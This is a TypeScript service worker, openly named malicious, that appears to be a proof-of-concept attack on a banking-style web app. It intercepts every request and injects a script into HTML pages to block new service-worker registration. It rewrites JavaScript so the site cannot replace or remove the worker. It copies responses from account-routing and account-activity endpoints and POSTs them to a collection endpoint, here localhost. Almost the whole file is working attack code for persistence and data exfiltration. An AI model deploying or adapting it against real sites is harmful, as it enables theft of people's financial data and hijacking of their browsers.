self.addEventListener("install", () => {
    console.log("Hello from the malicious service worker")
    // @ts-expect-error Known ts bug with webworker types
    self.skipWaiting();
})

self.addEventListener("activate", () => {
    // @ts-expect-error Known ts bug with webworker types
    self.clients.claim()
})


// @ts-expect-error More typing annoyances
self.addEventListener("fetch", (event: FetchEvent) => {
    console.log("Malicious service worker has intercepted the request")
    event.respondWith(_handleRequest(event.request))
})

const leakPaths = new Set([
    "/svc/rr/accounts/secure/v1/account/routing/list",
    "/svc/rr/accounts/secure/v4/activity/dda/list"
])

async function _handleRequest(req: Request) : Promise<Response> {
    const originalResponse = await fetch(req)
    const url = new URL(req.url)
    let finalData: string
    if(req.mode === "navigate") {
        // It is a navigate request and we need to stop service worker registration
        finalData = _handleHtml(await originalResponse.text())
    } else if(originalResponse.headers.get("content-type")?.includes("javascript")) {
        finalData = _handleJs(await originalResponse.text())
    } else {
        if(leakPaths.has(url.pathname)) {
            const clonedResponse = originalResponse.clone()
            const data = await clonedResponse.text()
            leakData(data, req.url)
        }
        return originalResponse
    }
    const newResponse = new Response(
        finalData,
        {
            status: originalResponse.status,
            statusText: originalResponse.statusText,
            headers: originalResponse.headers
        }
    )
    return newResponse
}


const userId = crypto.randomUUID()
async function leakData(data: any, url: string): Promise<void> {
    await fetch("http://localhost:8080/leak", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            id: userId,
            data,
            url
        })
    })
}

function _handleHtml(originalDocument: string) : string {
    return originalDocument.replace("<head>", `<head>
    <script>
        navigator.serviceWorker.register = () => new Promise(resolve => {})
        //# sourceURL=maliciousInjectedScript.js
    </script>`)
}

function _handleJs(originalDocument: string) : string {
    return originalDocument
        // Removes any possibility of anything being called on the service worker object
        .replace(/navigator\.serviceWorker/g, "window")
        // Fixes cases with the if("serviceWorker" in navigator)
        .replace(/["']serviceWorker['"]/g, "'maliciousServiceWorker'")
}